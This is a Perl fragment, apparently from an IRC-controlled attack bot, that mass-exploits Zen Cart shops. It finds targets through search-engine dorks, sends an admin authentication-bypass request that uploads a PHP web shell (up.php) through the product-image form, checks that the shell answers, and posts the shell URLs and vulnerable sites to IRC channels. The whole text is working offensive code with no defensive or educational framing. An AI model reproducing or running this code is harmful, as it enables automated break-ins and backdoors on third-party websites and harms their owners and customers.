sub zen_exploit() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $dork = $_[2];
	my $engine = $_[3];
	my $nick = $_[4];
	my $count = 0;
        my @totexploit = &search_engine($chan,$bug,$dork,$engine,$zenlogo,$nick);
        my $num = scalar(@totexploit);
        if ($num > 0){
    	foreach my $site(@totexploit){
			$count++;
		if ($count == $num-1) { &msg("$chan","$zenlogo4$engine14 Searching..."); }
			       my $shell = "http://".$site."images/up.php";
                   my $test = "http://".$site."admin/product.php/password_forgotten.php?action=new_product_preview";
                   my $html = &zen_upl_query($test);
                        if ($html =~ /<td class=\"messageStackSuccess\"><img src="images\/icons\/success\.gif/) {
			            &zen_install($chan,$site,$engine);
                        if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                            my $res = &get_content($shell);
                            if ($res =~ /Kan7ut/) {
			                &msg("$chan","$zenlogo4$engine4 Shell14 ".$shell."");	
							&msg("$channel","$zenlogo4$engine4 Shell14 ".$shell."");						
                        sleep(1);
                    }
                    else {
                    &msg("$chan","$zenlogo4$engine4 VULN14 http://".$site."");
                    }
                    sleep(1);
                } exit; } sleep(1);
            }
        }
    }
}

sub zen_upl_query() {
    my $url = $_[0];
    my $ua  = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(10);
    my $req = $ua->post($url,
      Content_Type=>'multipart/form-data',
      Content=>["products_image"=>["up.php"]]);
    return $req->content;
}
